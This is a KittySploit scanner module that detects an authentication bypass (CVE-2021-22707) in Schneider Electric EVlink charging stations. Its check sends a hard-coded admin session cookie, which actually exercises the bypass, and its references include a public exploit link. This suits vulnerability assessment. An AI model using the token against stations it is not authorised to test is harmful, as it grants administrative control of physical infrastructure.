#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A CWE-798: Use of Hard-coded Credentials vulnerability exists in EVlink City (EVC1S22P4 / EVC1S7P4 all version."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EVlink City < R8 V3.4.0.1 - Authentication Bypass Detection',
        'description': 'A CWE-798: Use of Hard-coded Credentials vulnerability exists in EVlink City (EVC1S22P4 / EVC1S7P4 all versions prior to R8 V3.4.0.1), EVlink Parking (EVW2 / EVF2 / EV.2 all versions prior to R8 V3.4.0.1), and EVlink Smart Wallbox (EVB1A all versions prior to R8 V3.4.0.1 ) that could allow an attacker to issue unauthorized commands to the charging station web server with administrative privileges.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'evlink', 'auth-bypass', 'schneider-electric', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://codeberg.org/AmenoCat/CVE-2021-22707-PoC/raw/branch/main/exploit.sh',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-22707',
            'http://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2021-194-06',
        ],
        'cve': 'CVE-2021-22707',
    }

    def run(self):
        path = '/cgi-bin/cgiServer?worker=IndexNew'
        r = self.http_request(method='GET', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': 'CURLTOKEN=b35fcdc1ea1221e6dd126e172a0131c5a; SESSIONID=admin'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('?worker=Cluster" name="cluster" id="id_cluster',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='EVlink City < R8 V3.4.0.1 - Authentication Bypass detected', path=path)
            return True
        return False

